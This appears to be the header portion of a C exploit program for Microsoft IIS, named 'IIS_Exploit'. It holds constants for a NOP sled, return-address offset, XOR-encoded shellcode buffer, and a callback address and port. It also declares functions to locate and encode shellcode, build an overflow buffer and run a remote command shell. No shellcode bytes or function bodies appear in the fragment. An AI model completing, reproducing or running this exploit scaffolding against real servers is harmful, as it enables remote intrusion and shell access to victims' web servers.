/*
#include <windows.h> 
#include <winsock.h>
#include <stdio.h>
#include <httpext.h>
*/

#define  LANGUAGE    950

#define  FNENDLONG   0x08
#define  NOPCODE	 'B'    // INC EDX    0x90
#define  NOPLONG     0x50
#define  BUFFSIZE    0x20000
#define  PATHLONG    0x12

#define  RETEIPADDRESS 0x100

#define  SHELLBUFFSIZE 0x800 
#define  DATABASE      0x41
#define  DATAXORCODE   0x55
#define  LOCKBIGNUM    19999999
#define  LOCKBIGNUM2   13579139
#define  WEBPORT       80  
#define  SRLF          "\r\n"    
 

void     findshellcodefnlock();
void     shellcodefnlock();
void     findshellcodefn();
void     shellcodefn(char *ecb);
void     bufflock(char *buff,int leng);

void     cleanchkesp(char *fnadd,char *shellbuff,char *chkespadd ,int len);

void     iisput(int fd,char *str);
void     iisget(int fd,char *str);
void     iiscmd(int fd,char *str);
void     shellcmd(int fd);
int      newrecv(int fd,char *buff,int size,int flag);
int      newsend(int fd,char *buff,int size,int flag);
char     *getfnaddress(char *fn);
int      codeshell(char *codebuff,int bufflen,char *shell,int shelllen);
int      codefindshell(char *codebuff,int bufflen,char *shell,int shelllen);
int      getapistr(char *buff);
int      GetShellcode(char *buffer);
int      GetFindShellcode(char *buffer);

void     getvar(int argc, char **argv);
void     printinfo();

int      getoverbuff(char *overbuff);


  int xordatabegin;
  int  lockintvar1,lockintvar2;
  char lockcharvar;








//*********************************************************************************

    #define  TIMEOUT                 2000
    #define  CALLBACK_PORT           1080
   
    unsigned char *server             = NULL;
    unsigned char *s_port             = "80";
    unsigned char *callback_address   = NULL;
    unsigned char *callback_port      = "1080";
    unsigned char *urlfile            =NULL;
    unsigned char *proxy              =NULL;
    unsigned char *offsetstr          =NULL;
    unsigned char *doscmd             =NULL;
    unsigned char *file               =NULL;
    unsigned char *version            =NULL;

	unsigned char *exp_name            ="IIS_Exploit";
   // unsigned char *doscmd             =NULL;



	int           server_socket       = 0;
	int           callback_socket     = 0;
    int           offset              = 0;
        






   
